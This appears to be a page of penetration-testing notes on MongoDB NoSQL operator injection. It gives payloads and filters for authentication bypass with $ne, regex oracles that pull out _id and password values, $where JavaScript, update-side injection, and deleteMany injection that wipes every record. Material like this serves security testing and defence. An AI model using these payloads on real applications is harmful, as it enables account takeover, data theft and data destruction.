# MongoDB specifics — the driver-level details

## The driver's type-coercion — the object-into-filter

```javascript
User.findOne({username: req.body.user})
```

`req.body.user` is `{$ne: null}` → the driver passes it as the filter —
no type-check — the object reaches `find()` — `detection.md`.

## The BSON-types — the `$type` set

```text
1=double 2=string 3=object 4=array 5=binData 7=objectId
8=bool 9=date 10=null 11=regex 16=int 18=long 19=decimal
```

`$type` — the field's BSON-type — `extraction.md`.

## The ObjectId — the `_id` oracle

```json
{"_id": {"$regex": "^a"}}
{"_id": {"$gt": ObjectId("...")}}
{"_id": {"$exists": true}}
```

`_id` is an ObjectId — `$regex` works on its hex-string — the
ObjectId-extraction — `extraction.md`.

## The dotted-path — `{"a.b": "x"}`

```json
{"profile.role": "admin"}
{"profile.role": {"$ne": "user"}}
{"meta.flag": {"$exists": true}}
```

`a.b` — the dotted-path — the subdoc-filter — `filter-bypass.md`.

## The `$where` — `enableJs` requirement

```json
{"$where": "this.user == 'admin'"}
```

`$where` runs JS — needs `enableJs: true` on the server — Atlas and
most modern configs disable it — `operators-js.md`.

## The `$expr` — the aggregation-operators in find

```json
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^a"}}}
```

`$expr` — always available — the `$where` alternative — `aggregation.md`.

## The `findOne` vs `find` — the first-doc

`findOne` returns the FIRST doc — `find` returns ALL — the `$ne` on
`findOne` lands on the first doc — `auth-bypass.md`.

## The `find` + `limit` — the sorted-first

```javascript
db.users.find({user: {$ne: null}}).limit(1)
```

`find` + `limit(1)` — the first doc — the "which user" question —
`auth-bypass.md`.

## The sort — `sort({_id: -1})` — the latest-first

```javascript
db.users.find({user: {$ne: null}}).sort({_id: -1}).limit(1)
```

The sort — the latest-created user — `extraction.md`.

## The `updateOne` filter — the update-side

```javascript
db.users.updateOne({user: req.body.user}, {$set: {x: 1}})
```

The `updateOne`'s filter — an operator-injection inside the UPDATE —
the write-side — `update-injection.md`.

## The `deleteOne`/`deleteMany` — the delete-side

```javascript
db.users.deleteOne({user: req.body.user})
db.users.deleteMany({user: req.body.user})
```

The delete-filter — a `$ne` deletes ALL — `blast-radius`.

## The `countDocuments` — the count-oracle

```javascript
db.users.countDocuments({user: req.body.user})
```

The count — a `$ne` returns the total — a count-oracle — `extraction.md`.

## The `distinct` — the unique-values

```javascript
db.users.distinct("role", {user: {$ne: null}})
```

`distinct` — the unique values — a field-content oracle.

## The driver-errors — the fingerprints

```text
CastError: Cast to string failed for value "{ '$ne': null }"
MongoError: unknown operator: $foo
BSONError: ...
MongoServerError: $where is not allowed
```

The driver-error — `detection.md`.
